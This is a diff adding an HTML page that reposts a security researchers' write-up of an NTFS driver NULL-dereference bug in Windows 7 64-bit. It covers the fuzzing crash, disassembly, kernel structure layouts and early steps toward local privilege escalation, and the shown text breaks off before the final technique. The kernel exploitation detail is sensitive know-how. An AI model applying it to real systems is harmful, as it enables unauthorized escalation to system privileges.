@@ -1,0 +1,1209 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Introducing the USB Stick of Death，利用U盘入侵Windows - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="j00ru" /><meta name="description" content="Introducing the USB Stick of Death，利用U盘入侵Windows，插入U盘即中招。由于 Windows 内置文件系统的设备驱动程序（ntfs.sys）存在错误（可引起蓝屏等现象），当插入精心构造过的优盘时，会执行恶意ShellCode，最终导致获取系统权限……Several months back we have been playing with different file systems on various system platforms, examining the security posture and robustness of numerous device drivers’ implementations. One of the configurations we spent some time on was the commonly used NTFS on Microsoft Windows – as the file system is rather complex and still largely unexplored, we could expect its device driver to have some bugs to that would be easily uncovered. In addition, it was certainly tempting to be able to simply insert a USB stick, have it automatically mounted by the operating system and immediately compromise it by triggering a vulnerability in ntfs.sys. We had some promising results during the process, one being an interesting bug (though not quite dangerous) that we managed to analyze and exploit into a local elevation of privileges. In today’s post, we are providing some specifics regarding the nature of the vulnerability, and how it can be taken advantage of to acquire system privileges on the Microsoft Windows 7 64-bit platform." />
+<meta name="keywords" content="Introducing the USB Stick of Death，利用U盘入侵Windows，插入U盘即中招" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/3084/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="Introducing the USB Stick of Death，利用U盘入侵Windows" />
+<meta property="og:description" content="Introducing the USB Stick of Death，利用U盘入侵Windows，插入U盘即中招。由于 Windows 内置文件系统的设备驱动程序（ntfs.sys）存在错误（可引起蓝屏等现象），当插入精心构造过的优盘时，会执行恶意ShellCode，最终导致获取系统权限……Several months back we have been playing with different file systems on various system platforms, examining the security posture and robustness of numerous device drivers’ implementations. One of the configurations we spent some time on was the commonly used NTFS on Microsoft Windows – as the file system is rather complex and still largely unexplored, we could expect its device driver to have some bugs to that would be easily uncovered. In addition, it was certainly tempting to be able to simply insert a USB stick, have it automatically mounted by the operating system and immediately compromise it by triggering a vulnerability in ntfs.sys. We had some promising results during the process, one being an interesting bug (though not quite dangerous) that we managed to analyze and exploit into a local elevation of privileges. In today’s post, we are providing some specifics regarding the nature of the vulnerability, and how it can be taken advantage of to acquire system privileges on the Microsoft Windows 7 64-bit platform." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/3084/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2012-11-14T23:30:50&#43;08:00" />
+<meta property="article:modified_time" content="2012-11-15T00:04:35&#43;08:00" />
+
+<meta itemprop="name" content="Introducing the USB Stick of Death，利用U盘入侵Windows">
+<meta itemprop="description" content="Introducing the USB Stick of Death，利用U盘入侵Windows，插入U盘即中招。由于 Windows 内置文件系统的设备驱动程序（ntfs.sys）存在错误（可引起蓝屏等现象），当插入精心构造过的优盘时，会执行恶意ShellCode，最终导致获取系统权限……Several months back we have been playing with different file systems on various system platforms, examining the security posture and robustness of numerous device drivers’ implementations. One of the configurations we spent some time on was the commonly used NTFS on Microsoft Windows – as the file system is rather complex and still largely unexplored, we could expect its device driver to have some bugs to that would be easily uncovered. In addition, it was certainly tempting to be able to simply insert a USB stick, have it automatically mounted by the operating system and immediately compromise it by triggering a vulnerability in ntfs.sys. We had some promising results during the process, one being an interesting bug (though not quite dangerous) that we managed to analyze and exploit into a local elevation of privileges. In today’s post, we are providing some specifics regarding the nature of the vulnerability, and how it can be taken advantage of to acquire system privileges on the Microsoft Windows 7 64-bit platform."><meta itemprop="datePublished" content="2012-11-14T23:30:50&#43;08:00" />
+<meta itemprop="dateModified" content="2012-11-15T00:04:35&#43;08:00" />
+<meta itemprop="wordCount" content="5484">
+<meta itemprop="keywords" content="Windows,入侵,API,app,bug,exe,EXP,Exploit,IE,IP,NDS,Net,POS,Rat,Shell," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Introducing the USB Stick of Death，利用U盘入侵Windows"/>
+<meta name="twitter:description" content="Introducing the USB Stick of Death，利用U盘入侵Windows，插入U盘即中招。由于 Windows 内置文件系统的设备驱动程序（ntfs.sys）存在错误（可引起蓝屏等现象），当插入精心构造过的优盘时，会执行恶意ShellCode，最终导致获取系统权限……Several months back we have been playing with different file systems on various system platforms, examining the security posture and robustness of numerous device drivers’ implementations. One of the configurations we spent some time on was the commonly used NTFS on Microsoft Windows – as the file system is rather complex and still largely unexplored, we could expect its device driver to have some bugs to that would be easily uncovered. In addition, it was certainly tempting to be able to simply insert a USB stick, have it automatically mounted by the operating system and immediately compromise it by triggering a vulnerability in ntfs.sys. We had some promising results during the process, one being an interesting bug (though not quite dangerous) that we managed to analyze and exploit into a local elevation of privileges. In today’s post, we are providing some specifics regarding the nature of the vulnerability, and how it can be taken advantage of to acquire system privileges on the Microsoft Windows 7 64-bit platform."/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">Introducing the USB Stick of Death，利用U盘入侵Windows</h1>
+      
+      <div class="post-meta">
+        <time datetime="2012-11-14" class="post-time">
+          2012-11-14
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/windows/"> Windows </a>
+            <a href="https://lcx.cc/categories/%E5%85%A5%E4%BE%B5/"> 入侵 </a>
+            
+          </div>
+        <span class="more-meta"> 约 5484 字 </span>
+          <span class="more-meta"> 预计阅读 11 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	Introducing the USB Stick of Death，利用U盘入侵Windows，插入U盘即中招。
+</p>
+<p style="text-indent:2em;">
+	由于 Windows 内置文件系统的设备驱动程序（ntfs.sys）存在错误（可引起蓝屏等现象），当插入精心构造过的优盘时，会执行恶意ShellCode，最终导致获取系统权限……
+</p>
+<hr />
+<p style="text-indent:2em;">
+	<strong>(Bug found by <a href="http://gynvael.coldwind.pl/?lang=en&amp;id=489">Gynvael Coldwind</a>, exploit developed by Mateusz “j00ru” Jurczyk)</strong> 
+</p>
+<p style="text-indent:2em;">
+	Several months back we have been playing with different file systems on various system platforms, examining the security posture and robustness of numerous device drivers’ implementations. One of the configurations we spent some time on was the commonly used NTFS on Microsoft Windows – as the file system is rather complex and still largely unexplored, we could expect its device driver to have some bugs to that would be easily uncovered. In addition, it was certainly tempting to be able to simply insert a USB stick, have it automatically mounted by the operating system and immediately compromise it by triggering a vulnerability in <em>ntfs.sys</em>. We had some promising results during the process, one being an interesting bug (though not quite dangerous) that we managed to analyze and exploit into a <em>local elevation of privileges</em>. In today’s post, we are providing some specifics regarding the nature of the vulnerability, and how it can be taken advantage of to acquire system privileges on the Microsoft Windows 7 64-bit platform.
+</p>
+<p style="text-indent:2em;">
+	Please note that the presented issue requires the attacker to obtain physical access to the machine <strong>and</strong> have a local user in the system. Consequently, the only scenario in which it might be a problem security-wise is a local computer shared between multiple users with restricted privileges (e.g. schools, universities, hostels) and thus has been rated as low-severity by both us and MSRC, which has been informed about the matter and claimed to have passed the information to the Windows team for potential fixing as a stability issue somewhere in the future. We are releasing some of its technical details as an interesting case study of Windows kernel exploitation using somewhat novel techniques to achieve reliable execution of code with escalated privileges. Enjoy!
+</p>
+<h4>
+	Introduction
+</h4>
+<p style="text-indent:2em;">
+	One of the obvious steps that we took to test the reliability of the file system management implemented in <em>ntfs.sys</em> was running a trivial bit-flipping fuzzer to see if we could reproduce any interesting behavior (such as a system crash) with such simple techniques. The first indicator of a possibly serious bug – a Blue Screen of Death – was encountered after roughly 17 hours of fuzzing time on a single laptop, and looked like the following:
+</p>
+<pre class="prettyprint">EXCEPTION_RECORD:  fffff88006fd7fd8 -- (.exr 0xfffff88006fd7fd8)
+ExceptionAddress: fffff8800125311e (Ntfs!NtfsAcquirePagingResourceExclusive+0x0000000000000016)
+  ExceptionCode: c0000005 (Access violation)
+ ExceptionFlags: 00000000
+NumberParameters: 2
+  Parameter[0]: 0000000000000000
+  Parameter[1]: 0000000000000060
+Attempt to read from address 0000000000000060
+
+CONTEXT:  fffff88006fd7830 -- (.cxr 0xfffff88006fd7830)
+rax=0000000000000702 rbx=fffffa8005c0b180 rcx=0000000000000000
+rdx=fffff8a005859ce0 rsi=fffffa8005c0b7e0 rdi=0000000000000000
+rip=fffff8800125311e rsp=fffff88006fd8218 rbp=fffff88006fd85a0
+r8=0000000000000001  r9=0000000000000000 r10=fffff8a00b254010
+r11=fffff88006fd81e8 r12=fffffa8005b36ae0 r13=0000000000000000
+r14=0000000000000001 r15=00000000c000026e
+iopl=0         nv up ei pl zr na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+Ntfs!NtfsAcquirePagingResourceExclusive+0x16:
+fffff880`0125311e 488b4960        mov     rcx,qword ptr [rcx+60h] ds:002b:00000000`00000060=????????????????
+Resetting default scope
+
+[...]
+
+STACK_TEXT:
+fffff880`06fd8218 fffff880`01326de4 : [...] : Ntfs!NtfsAcquirePagingResourceExclusive+0x16
+fffff880`06fd8220 fffff880`013178a3 : [...] : Ntfs!NtfsPerformDismountOnVcb+0x758
+fffff880`06fd8330 fffff880`01317656 : [...] : Ntfs!NtfsLockVolumeInternal+0xf3
+fffff880`06fd83a0 fffff880`013053ee : [...] : Ntfs!NtfsLockVolume+0x1f6
+fffff880`06fd8480 fffff880`0130553d : [...] : Ntfs!NtfsUserFsRequest+0x2de
+fffff880`06fd84c0 fffff880`0102ebcf : [...] : Ntfs!NtfsFsdFileSystemControl+0x13d
+fffff880`06fd8560 fffff880`01031aea : [...] : fltmgr!FltpLegacyProcessingAfterPreCallbacksCompleted+0x24f
+fffff880`06fd85f0 fffff880`010670b5 : [...] : fltmgr!FltPerformSynchronousIo+0x2ca
+fffff880`06fd8690 fffff880`01067b38 : [...] : fltmgr!IssueControlOperation+0x395
+fffff880`06fd8720 fffff880`031555df : [...] : fltmgr!FltFsControlFile+0x48
+fffff880`06fd8780 fffff880`03155d0e : [...] : FsDepends!DepFSSendDismountRequest+0x143
+fffff880`06fd87e0 fffff880`0315582d : [...] : FsDepends!DepFSDismountDependencyList+0xd6
+fffff880`06fd8840 fffff880`031747a8 : [...] : FsDepends!DependentFSDismountForUnsurface+0x175
+fffff880`06fd88a0 fffff880`031749f2 : [...] : vhdmp!VhdmpiHaltActiveSurface+0x78
+fffff880`06fd88f0 fffff880`03177156 : [...] : vhdmp!VhdmpiHaltSurfaceOrWait+0xb2
+fffff880`06fd8940 fffff880`0316e117 : [...] : vhdmp!VhdmpiRemoveVirtualDisk+0x246
+fffff880`06fd8990 fffff880`03166177 : [...] : vhdmp! ?? : [...] :FNODOBFM: [...] :`string'+0x4d87
+fffff880`06fd89c0 fffff800`0299e717 : [...] : vhdmp!VhdmpFirstLevelIrpHandler+0x87
+fffff880`06fd8a10 fffff800`0299ef76 : [...] : nt!IopXxxControlFile+0x607
+fffff880`06fd8b40 fffff800`02687453 : [...] : nt!NtDeviceIoControlFile+0x56
+fffff880`06fd8bb0 00000000`76e0138a : [...] : nt!KiSystemServiceCopyEnd+0x13
+00000000`010fe548 000007fe`fd49a249 : [...] : ntdll!NtDeviceIoControlFile+0xa
+00000000`010fe550 00000000`76ca683f : [...] : KERNELBASE!DeviceIoControl+0x75
+00000000`010fe5c0 000007fe`f32d3994 : [...] : kernel32!DeviceIoControlImplementation+0x7f
+00000000`010fe610 000007fe`f2c6886b : [...] : VirtDisk!DetachVirtualDisk+0x6c
+00000000`010fe670 00000000`ff61f734 : [...] : vdsvd!COpenVDisk: [...] :Detach+0xb3
+00000000`010fe6a0 000007fe`fd8823d5 : [...] : vds!CVdsOpenVDisk: [...] :Detach+0x3c
+00000000`010fe6e0 000007fe`fd92b68e : [...] : RPCRT4!Invoke+0x65
+00000000`010fe740 000007fe`fd8848d6 : [...] : RPCRT4!Ndr64StubWorker+0x61b
+00000000`010fed00 000007fe`fee60883 : [...] : RPCRT4!NdrStubCall3+0xb5
+00000000`010fed60 000007fe`fee60ccd : [...] : ole32!CStdStubBuffer_Invoke+0x5b [d:\w7rtm\com\rpc\ndrole\stub.cxx @ 1586]
+00000000`010fed90 000007fe`fee60c43 : [...] : ole32!SyncStubInvoke+0x5d [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1187]
+00000000`010fee00 000007fe`fed1a4f0 : [...] : ole32!StubInvoke+0xdb [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1396]
+00000000`010feeb0 000007fe`fee614d6 : [...] : ole32!CCtxComChnl: [...] :ContextInvoke+0x190 [d:\w7rtm\com\ole32\com\dcomrem\ctxchnl.cxx @ 1262]
+00000000`010ff040 000007fe`fee6122b : [...] : ole32!AppInvoke+0xc2 [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1086]
+00000000`010ff0b0 000007fe`fee5fd6d : [...] : ole32!ComInvokeWithLockAndIPID+0x52b [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1727]
+00000000`010ff240 000007fe`fd8750f4 : [...] : ole32!ThreadInvoke+0x30d [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 4751]
+00000000`010ff2e0 000007fe`fd874f56 : [...] : RPCRT4!DispatchToStubInCNoAvrf+0x14
+00000000`010ff310 000007fe`fd87775b : [...] : RPCRT4!RPC_INTERFACE: [...] :DispatchToStubWorker+0x146
+00000000`010ff430 000007fe`fd87769b : [...] : RPCRT4!RPC_INTERFACE: [...] :DispatchToStub+0x9b
+00000000`010ff470 000007fe`fd877632 : [...] : RPCRT4!RPC_INTERFACE: [...] :DispatchToStubWithObject+0x5b
+00000000`010ff4f0 000007fe`fd87532d : [...] : RPCRT4!LRPC_SCALL: [...] :DispatchRequest+0x422
+00000000`010ff5d0 000007fe`fd892e7f : [...] : RPCRT4!LRPC_SCALL: [...] :HandleRequest+0x20d
+00000000`010ff700 000007fe`fd892a35 : [...] : RPCRT4!LRPC_ADDRESS: [...] :ProcessIO+0x3bf
+00000000`010ff840 00000000`76dcb68b : [...] : RPCRT4!LrpcIoComplete+0xa5
+00000000`010ff8d0 00000000`76dcfeff : [...] : ntdll!TppAlpcpExecuteCallback+0x26b
+00000000`010ff960 00000000`76ca652d : [...] : ntdll!TppWorkerThread+0x3f8
+00000000`010ffc60 00000000`76ddc521 : [...] : kernel32!BaseThreadInitThunk+0xd
+00000000`010ffc90 00000000`00000000 : [...] : ntdll!RtlUserThreadStart+0x1d</pre>
+<p style="text-indent:2em;">
+	Visibly, it was a NULL pointer dereference crash triggered during the unmounting of a randomly mutated NTFS volume. Specifically, the vulnerable code path was reached during the handling of a FSCTL_LOCK_VOLUME control code sent to the volume by the “vds.exe” utility while unmounting the drive. If one tries to send the control code alone to the volume from within his own test application, it turns out to result in exactly the same behavior, enabling a rogue user to get the kernel to reference a NULL address in the context of an attacker-controlled process. Consequently, it is possible to have a direct control over any data read by the kernel from the memory area and potentially make it do bad things to itself. Let’s get some more context by examining the routine in which the exception takes place:
+</p>
+<pre class="prettyprint">.text:0000000000019108 NtfsAcquirePagingResourceExclusive proc near
+.text:0000000000019108
+.text:0000000000019108                 mov     eax, 702h
+.text:000000000001910D                 cmp     ax, [rdx]
+.text:0000000000019110                 jz      short loc_1912C
+.text:0000000000019112                 xor     ecx, ecx
+.text:0000000000019114                 cmp     [rdx+10h], rcx
+.text:0000000000019118                 jz      short loc_1911E
+.text:000000000001911A                 mov     rcx, [rdx+70h]
+.text:000000000001911E
+.text:000000000001911E loc_1911E:
+.text:000000000001911E                 mov     rcx, [rcx+60h]
+.text:0000000000019122                 mov     dl, r8b
+.text:0000000000019125                 jmp     cs:__imp_ExAcquireResourceExclusiveLite
+.text:000000000001912C
+.text:000000000001912C loc_1912C:
+.text:000000000001912C                 mov     rcx, rdx
+.text:000000000001912F                 jmp     short loc_1911E
+.text:000000000001912F NtfsAcquirePagingResourceExclusive endp</pre>
+<p style="text-indent:2em;">
+	If we consider the fact that the second parameter of the function is a pointer to an SCB (<a href="http://msdn.microsoft.com/en-us/library/windows/hardware/ff540359%28v=vs.85%29.aspx">Stream Control Block</a>) structure, which in turn starts with <a href="http://msdn.microsoft.com/en-us/library/windows/hardware/ff547334%28v=vs.85%29.aspx">FSRTL_ADVANCED_FCB_HEADER</a>, the above assembly translates to the following pseudo-code:
+</p>
+<pre class="prettyprint lang-cpp">BOOLEAN NtfsAcquirePagingResourceExclusive(PSCB scb, BOOLEAN arg)
+{
+  PUNKNOWN_STRUCT ptr = NULL;
+
+  if (scb-&gt;NodeTypeCode == 0x702) {
+    ptr = scb;
+  } else {
+    if ( scb-&gt;PagingIoResource != NULL ) {
+      ptr = scb-&gt;fcb;
+    }
+  }
+
+  return ExAcquireResourceExclusiveLite(ptr-&gt;Resource, arg);
+}</pre>
+<p style="text-indent:2em;">
+	Interestingly, the function initializes a pointer to a structure with NULL, then only fills it with an actual object reference if certain conditions are met, and later uses the pointer in a memory operation to obtain an argument for the <em>nt!AcquireResourceExclusiveLite</em> routine (an <a href="http://msdn.microsoft.com/en-us/library/windows/hardware/ff548046%28v=vs.85%29.aspx">ERESOURCE</a> structure pointer). In our example, the impossible code branch is taken, leading to the usage of a NULL address and therefore loading data from fully-controlled user-mode memory regions.
+</p>
+<pre class="prettyprint">kd&gt; p
+Ntfs!NtfsAcquirePagingResourceExclusive+0x16:
+fffff880`0123511e 488b4960        mov     rcx,qword ptr [rcx+60h]
+kd&gt; ? rcx
+Evaluate expression: 0 = 00000000`00000000
+kd&gt; ? poi(rcx+60)
+Evaluate expression: 4702111234474983745 = 41414141`41414141</pre>
+<p style="text-indent:2em;">
+	However, taking the new mitigation mechanisms introduced in Windows 8 into account, including the unavailability of NULL page mapping functionality otherwise reachable through <a href="http://www.uninformed.org/?v=10&amp;a=2">NtAllocateVirtualMemory</a>, the bug would only be exploitable on Windows 7 and earlier versions; it doesn’t make any difference though, since the crash doesn’t reproduce on Windows 8 anyway. For the affected platforms though, exploitation odds are looking good at this point of analysis.
+</p>
+<h4>
+	Exploitation phase #1: the context
+</h4>
+<p style="text-indent:2em;">
+	In order to achieve reliable escalation into ring-0, it is necessary to examine the memory operations performed by <em>ExAcquireResourceExclusiveLite</em> upon the ERESOURCE structure. After a quick look at IDA, the function seems to be rather complicated: a lot of fields are being read from and written to in various relations, and some parts of the code can even get stuck waiting forever for a particular bit in a bitmask to be set. If you look closely though, there is one code path that is relatively simple and self-contained, thus has the potential to aid in successful exploitation (the <em>rbx</em> register stores the structure base address):
+</p>
+<pre class="prettyprint">.text:0000000140084470                 xor     r12d, r12d
+[...]
+.text:0000000140084449                 cmp     [rbx+40h], r12d
+.text:000000014008444D                 jnz     loc_14008433D
+.text:0000000140084453                 mov     edx, r12d
+.text:0000000140084456                 jmp     loc_1400842CE
+[...]
+.text:00000001400842CE                 and     dword ptr [rbx+38h], 3
+.text:00000001400842D2                 or      dword ptr [rbx+38h], 4
+.text:00000001400842D6                 mov     r13d, 1
+.text:00000001400842DC                 mov     [rbx+40h], r13d
+.text:00000001400842E0                 mov     [rbx+18h], r13w
+.text:00000001400842E5                 mov     [rbx+30h], r14
+.text:00000001400842E9                 mov     eax, 80h
+.text:00000001400842EE                 movzx   ebp, r13b
+.text:00000001400842F2                 or      [rbx+1Ah], ax</pre>
+<p style="text-indent:2em;">
+	Leading the kernel to execute the above branch has several advantages over other options: it only performs a constant number of simple memory operations over the structure fields, is simple to understand and returns immediately (i.e. doesn’t wait for a particular bit combination etc). Back to pseudo-code, the interesting assembly snippet can be represented using a few expressions:
+</p>
+<pre class="prettyprint">if [dword](x + 0x40) == 0
+  [dword](x + 0x38) = ([dword](x + 0x38) &amp; 3) | 4;
+  [dword](x + 0x40) = 1;
+  [word](x + 0x18) = 1;
+  [qword](x + 0x30) = PsGetCurrentThread();
+  [word](x + 0x1a) |= 0x80;</pre>
+<p style="text-indent:2em;">
+	To add some more context, the Windows 7 64-bit ERESOURCE structure is defined as follows:
+</p>
+<pre class="prettyprint">kd&gt; dt _ERESOURCE
+nt!_ERESOURCE
+  +0x000 SystemResourcesList : _LIST_ENTRY
+  +0x010 OwnerTable       : Ptr64 _OWNER_ENTRY
+  +0x018 ActiveCount      : Int2B
+  +0x01a Flag             : Uint2B
+  +0x020 SharedWaiters    : Ptr64 _KSEMAPHORE
+  +0x028 ExclusiveWaiters : Ptr64 _KEVENT
+  +0x030 OwnerEntry       : _OWNER_ENTRY
+  +0x040 ActiveEntries    : Uint4B
+  +0x044 ContentionCount  : Uint4B
+  +0x048 NumberOfSharedWaiters : Uint4B
+  +0x04c NumberOfExclusiveWaiters : Uint4B
+  +0x050 Reserved2        : Ptr64 Void
+  +0x058 Address          : Ptr64 Void
+  +0x058 CreatorBackTraceIndex : Uint8B
+  +0x060 SpinLock         : Uint8B</pre>
+<p style="text-indent:2em;">
+	Now, that’s a lot of memory operations, if the attacker wants to supply a bogus parameter such as an important system structure! Given the amount of writes taking place at various offsets, it really is quite non-trivial to accomplish successful privilege escalation without severely corrupting memory around the purposely overwritten value. At first, I had two ideas of how the problem could be approached:
+</p>
+<ol>
+	<li>
+		<p style="text-indent:2em;">
+			Find a memory region with an ETHREAD address (in)directly related to system security and attempt to replace it with the current thread’s structure address (see offset 0×30), hoping that the other operations would not deal critical damage to the surrounding data. An example of such approach would be to inject the current thread into a more-privileged process by altering a thread list within the corresponding process’ EPROCESS structure.
+		</p>
+	</li>
+	<li>
+		<p style="text-indent:2em;">
+			Find a writeable memory region with a kernel-mode function pointer and use the (x + 0×38) or (x + 0×40) memory writes to replace the higher 32-bits of the ring-0 address (typically equal to 0xFFFFF8A0) with a user-mode prefix containing zeros for the most significant 31 bits. An example of such approach would be to overwrite one of the KernelRoutine / RundownRoutine members of the KAPC structure:
+		</p>
+<pre class="prettyprint">kd&gt; dt _KAPC
+nt!_KAPC
+  +0x000 Type             : UChar
+  +0x001 SpareByte0       : UChar
+  +0x002 Size             : UChar
+  +0x003 SpareByte1       : UChar
+  +0x004 SpareLong0       : Uint4B
+  +0x008 Thread           : Ptr64 _KTHREAD
+  +0x010 ApcListEntry     : _LIST_ENTRY
+  +0x020 KernelRoutine    : Ptr64     void
+  +0x028 RundownRoutine   : Ptr64     void
+  +0x030 NormalRoutine    : Ptr64     void
+  +0x038 NormalContext    : Ptr64 Void
+  +0x040 SystemArgument1  : Ptr64 Void
+  +0x048 SystemArgument2  : Ptr64 Void
+  +0x050 ApcStateIndex    : Char
+  +0x051 ApcMode          : Char
+  +0x052 Inserted         : UChar</pre>
+		<p style="text-indent:2em;">
+			If carried out correctly (i.e. spent more time on), this technique could be most likely used to exploit the discussed bug, thanks to several fortunate facts: kernel-mode addresses of KAPC structures are known to user-mode programs <a href="http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-003.pdf">if allocated as Reserve Objects</a>, and the 32 user-controlled bytes (highlighted) are placed directly after kernel-mode pointers, making it possible to set the bytes properly in order to meet the (x + 0×40) == 0 condition.
+		</p>
+	</li>
+</ol>
+<p style="text-indent:2em;">
+	I have done some quick testing trying the most intuitive ideas, but always failed miserably – either it was impossible to match the offsets correctly so that meaningful data was overwritten in the desired way, or the other modifications done to surrounding memory would sooner or later bring the operating system down. After one or two hours of continuous BSoDs, I decided to see if my most recent discovery – Private Namespace objects – could come in handy. And they really did, as a fully reliable exploit was eventually implemented using this very technique :)
+</p>
+<h4>
+	Exploitation phase #2: private namespaces
+</h4>
+<p style="text-indent:2em;">
+	The following high-level description of private namespaces <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684295%28v=vs.85%29.aspx">can be found in MSDN</a>:
+</p>
+<p style="padding-left:30px;">
+	<em>An object namespace protects named objects from unauthorized access. Creating a private namespace enables applications and services to build a more secure environment.</em> 
+</p>
+<p style="padding-left:30px;">
